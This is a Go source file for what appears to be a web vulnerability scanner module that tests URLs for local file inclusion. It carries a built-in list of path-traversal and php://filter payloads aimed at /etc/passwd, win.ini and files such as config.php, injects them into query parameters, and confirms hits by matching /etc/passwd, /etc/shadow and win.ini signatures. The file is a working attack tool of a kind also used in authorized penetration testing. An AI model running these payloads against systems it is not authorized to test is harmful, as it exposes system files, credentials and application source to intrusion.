package scanner

import (
	"bugx/pkg/utils"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	nurl "net/url"
	"strings"
	"sync"
)

type LFIScanner struct{}

// File signatures that CONFIRM LFI - from LFISuite/dotdotpwn
var fileSignatures = map[string]struct {
	Patterns []string
	OS       string
	File     string
}{
	"etc_passwd": {
		Patterns: []string{
			"root:x:0:0:",
			"root:*:0:0:",
			"daemon:x:1:1:",
			"bin:x:2:2:",
			"nobody:x:",
			"/bin/bash",
			"/bin/sh",
			"/sbin/nologin",
		},
		OS:   "Linux",
		File: "/etc/passwd",
	},
	"etc_shadow": {
		Patterns: []string{
			"root:$",
			"root:!:",
			"root:*:",
			"daemon:*:",
		},
		OS:   "Linux",
		File: "/etc/shadow",
	},
	"win_ini": {
		Patterns: []string{
			"[fonts]",
			"[extensions]",
			"[mci extensions]",
			"for 16-bit app support",
			"[Mail]",
			"[files]",
		},
		OS:   "Windows",
		File: "C:\\Windows\\win.ini",
	},
	"win_hosts": {
		Patterns: []string{
			"127.0.0.1",
			"localhost",
			"# Copyright",
		},
		OS:   "Windows",
		File: "C:\\Windows\\System32\\drivers\\etc\\hosts",
	},
	"php_source": {
		Patterns: []string{
			"<?php",
			"<?=",
			"function ",
			"class ",
			"$_GET",
			"$_POST",
			"include(",
			"require(",
		},
		OS:   "Any",
		File: "PHP Source Code",
	},
}

// LFI payloads targeting known files
var lfiPayloads = []struct {
	Payload      string
	TargetFile   string
	SignatureKey string
}{
	// Linux /etc/passwd
	{"../../../etc/passwd", "/etc/passwd", "etc_passwd"},
	{"....//....//....//etc/passwd", "/etc/passwd", "etc_passwd"},
	{"..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd", "etc_passwd"},
	{"..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "etc_passwd"},
	{"/etc/passwd", "/etc/passwd", "etc_passwd"},
	{"....//....//....//....//etc/passwd", "/etc/passwd", "etc_passwd"},
	{"..\\..\\..\\etc\\passwd", "/etc/passwd", "etc_passwd"},
	{"/etc/passwd%00", "/etc/passwd", "etc_passwd"},
	{"../../../etc/passwd%00.jpg", "/etc/passwd", "etc_passwd"},

	// Windows win.ini
	{"..\\..\\..\\windows\\win.ini", "win.ini", "win_ini"},
	{"....//....//....//windows/win.ini", "win.ini", "win_ini"},
	{"C:\\Windows\\win.ini", "win.ini", "win_ini"},
	{"/windows/win.ini", "win.ini", "win_ini"},
	{"..%5c..%5c..%5cwindows%5cwin.ini", "win.ini", "win_ini"},

	// PHP wrappers (for source disclosure)
	{"php://filter/convert.base64-encode/resource=index.php", "PHP Source", "php_source"},
	{"php://filter/read=convert.base64-encode/resource=../index.php", "PHP Source", "php_source"},
	{"php://filter/convert.base64-encode/resource=config.php", "PHP Source", "php_source"},
}

func (s *LFIScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting LFI Scan..."))
	fmt.Println(utils.White("[*] Verifying by checking actual file content signatures"))
	fmt.Println(utils.White("[*] Only CONFIRMED file inclusions will be reported\n"))

	// Generate unique canary for false positive detection
	canaryBytes := make([]byte, 8)
	rand.Read(canaryBytes)
	canary := hex.EncodeToString(canaryBytes)

	for _, url := range config.URLs {
		// Get baseline
		baseline, err := utils.MakeRequest(url+"test_nonexistent_"+canary, config.Cookie, config.Timeout)
		if err != nil {
			continue
		}

		// Use built-in payloads + user payloads
		payloadsToTest := lfiPayloads

		for _, lfiPayload := range payloadsToTest {
			wg.Add(1)
			sem <- struct{}{}
			go func(u string, payload struct {
				Payload      string
				TargetFile   string
				SignatureKey string
			}) {
				defer wg.Done()
				defer func() { <-sem }()

				// Fuzzing Logic:
				// If URL has parameters (e.g. ?file=image.jpg), we MUST replace the value (e.g. ?file=../../etc/passwd)
				// instead of appending (which results in ?file=image.jpg../../etc/passwd -> Invalid).
				// We also keep the 'append' strategy as a fallback for RESTful URLs or raw appends.

				var targets []string

				// 1. Try Parameter Replacement (The Fix)
				parsedURL, err := nurl.Parse(u)
				if err == nil && len(parsedURL.Query()) > 0 {
					// Manually modify RawQuery to preserve payload formatting (avoiding extra URL encoding of ../)
					rawQuery := parsedURL.RawQuery
					params := strings.Split(rawQuery, "&")
					for i, param := range params {
						// Split key=value
						kv := strings.SplitN(param, "=", 2)
						key := kv[0]

						// Construct new query: key=PAYLOAD
						// We replace the logic to inject payload specifically into this parameter
						newParams := make([]string, len(params))
						copy(newParams, params)
						newParams[i] = key + "=" + payload.Payload

						// Rebuild URL
						fuzzedURL := *parsedURL
						fuzzedURL.RawQuery = strings.Join(newParams, "&")
						targets = append(targets, fuzzedURL.String())
					}
				}

				// 2. Fallback / Original Strategy: Simple Append
				// Useful for URLs like http://site.com/file= (empty) or manual fuzz points
				targets = append(targets, u+payload.Payload)

				// Deduplicate
				uniqueTargets := make(map[string]bool)
				var finalTargets []string
				for _, t := range targets {
					if !uniqueTargets[t] {
						uniqueTargets[t] = true
						finalTargets = append(finalTargets, t)
					}
				}

				for _, targetURL := range finalTargets {
					resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
					if err != nil {
						continue
					}

					// 1. Status Code Check: If we get a 200 OK while baseline (non-existent) was 404/500, that's interesting.
					// But if baseline was 200 (soft 404), we rely on content difference.
					statusCodeMatch := resp.StatusCode == baseline.StatusCode

					// 2. Length/Content Check:
					// If status codes match, we need significant content difference.
					// If status codes differ (e.g. 404 vs 200), we proceed to signature check.
					if statusCodeMatch {
						// Use a simple ratio or just strict length diff if status matches
						// If bodies are identical size, it's definitely not it.
						if len(resp.Body) == len(baseline.Body) {
							return
						}
						// If the difference is very small (less than 5 chars), likely just dynamic time/date
						diff := len(resp.Body) - len(baseline.Body)
						if diff < 0 {
							diff = -diff
						}
						if diff < 5 {
							return
						}
					}

					// Verify with file signatures
					sig, exists := fileSignatures[payload.SignatureKey]
					if !exists {
						return
					}

					matchedPatterns := 0
					for _, pattern := range sig.Patterns {
						if strings.Contains(resp.Body, pattern) {
							matchedPatterns++
						}
					}

					// Need at least 2 pattern matches for confirmation
					if matchedPatterns >= 2 {
						fmt.Printf("%s %s\n",
							utils.Red("[✓] LFI CONFIRMED:"),
							utils.Cyan(targetURL))
						fmt.Printf("    → File: %s (%s), Matched patterns: %d\n",
							utils.Yellow(sig.File),
							utils.White(sig.OS),
							matchedPatterns)

						processor.Add(ScanResult{
							URL:        targetURL,
							Vulnerable: true,
							Payload:    payload.Payload,
							Details:    fmt.Sprintf("LFI - %s file included (%s)", sig.File, sig.OS),
						})
					}

					// Special check for PHP base64 wrapper
					if payload.SignatureKey == "php_source" {
						// Check for base64 encoded PHP
						if isBase64PHPSource(resp.Body) {
							fmt.Printf("%s %s\n",
								utils.Red("[✓] LFI CONFIRMED (PHP Source Disclosure):"),
								utils.Cyan(targetURL))
							fmt.Printf("    → Base64 encoded PHP source code detected\n")

							processor.Add(ScanResult{
								URL:        targetURL,
								Vulnerable: true,
								Payload:    payload.Payload,
								Details:    "LFI - PHP source code disclosure via php://filter",
							})
						}
					}

				} // Close finalTargets loop
			}(url, lfiPayload)
		}

		// Also test user-provided payloads
		for _, userPayload := range config.Payloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(url, payload string) {
				defer wg.Done()
				defer func() { <-sem }()

				targetURL := url + payload
				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
				if err != nil {
					return
				}

				// Check all file signatures
				for sigKey, sig := range fileSignatures {
					if sigKey == "php_source" {
						continue // Skip PHP source for user payloads
					}

					matchedPatterns := 0
					for _, pattern := range sig.Patterns {
						if strings.Contains(resp.Body, pattern) {
							matchedPatterns++
						}
					}

					if matchedPatterns >= 2 {
						fmt.Printf("%s %s\n",
							utils.Red("[✓] LFI CONFIRMED:"),
							utils.Cyan(targetURL))
						fmt.Printf("    → File: %s (%s), Matched patterns: %d\n",
							utils.Yellow(sig.File),
							utils.White(sig.OS),
							matchedPatterns)

						processor.Add(ScanResult{
							URL:        targetURL,
							Vulnerable: true,
							Payload:    payload,
							Details:    fmt.Sprintf("LFI - %s file included (%s)", sig.File, sig.OS),
						})
						return
					}
				}
			}(url, userPayload)
		}
	}

	wg.Wait()
	printLFISummary(processor.Results)
	return processor.Results
}

// isBase64PHPSource checks if the response contains base64-encoded PHP
func isBase64PHPSource(body string) bool {
	// Base64 patterns that indicate PHP source
	phpBase64Indicators := []string{
		"PD9waHA", // <?php
		"PD89",    // <?=
		"Pz4=",    // ?>
	}

	for _, indicator := range phpBase64Indicators {
		if strings.Contains(body, indicator) {
			return true
		}
	}
	return false
}

func printLFISummary(results []ScanResult) {
	linux, windows, php := 0, 0, 0
	for _, r := range results {
		if strings.Contains(r.Details, "Linux") {
			linux++
		} else if strings.Contains(r.Details, "Windows") {
			windows++
		} else if strings.Contains(r.Details, "PHP") {
			php++
		}
	}

	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("LFI Scan Summary:"))
	fmt.Printf("  %s Linux files: %d\n", utils.Red("●"), linux)
	fmt.Printf("  %s Windows files: %d\n", utils.Red("●"), windows)
	fmt.Printf("  %s PHP source disclosure: %d\n", utils.Red("●"), php)
	fmt.Printf("  %s Total CONFIRMED: %d\n", utils.Green("★"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are VERIFIED - actual file content confirmed!"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No confirmed LFI vulnerabilities found."))
	}
}
